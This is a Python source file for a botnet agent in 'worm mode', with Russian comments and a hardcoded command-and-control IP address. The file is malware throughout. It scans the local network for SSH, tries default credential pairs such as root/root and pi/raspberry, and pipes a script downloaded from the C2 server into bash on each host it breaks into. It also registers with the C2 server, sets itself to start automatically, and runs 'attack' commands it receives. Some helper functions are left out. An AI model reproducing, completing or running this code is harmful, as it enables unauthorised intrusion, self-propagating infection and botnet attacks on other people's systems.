#!/usr/bin/env python3
# AVZ-Aristo Agent v28.0 - Worm Mode
import socket, json, time, os, platform, subprocess, threading, random, ipaddress

C2_HOST = "80.249.146.202"
C2_PORT = 80
XOR_KEY = random.randint(1, 255)

# ... (функции xor_encrypt, xor_decrypt, get_info, auto_start, register, execute_attack)

def worm_spread():
    """Сканирует локальную сеть и пытается заразить другие устройства."""
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        return
    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
    print(f"[worm] Scanning local network: {network}")
    for host in network.hosts():
        ip = str(host)
        # Простая проверка порта 22 и попытка заражения через sshpass
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((ip, 22))
            s.close()
            for u, p in [("root", "root"), ("admin", "admin"), ("pi", "raspberry")]:
                cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {u}@{ip} 'wget -O- http://{C2_HOST}:8080/agent_bash.sh | bash'"
                try:
                    subprocess.run(cmd, shell=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass
        except:
            pass

def main():
    auto_start()
    register()
    threading.Thread(target=worm_spread, daemon=True).start()
    while True:
        cmds = send_ping()
        for cmd in cmds:
            if cmd.get("type") == "attack":
                execute_attack(cmd)
        time.sleep(15)

if __name__ == "__main__":
    main()
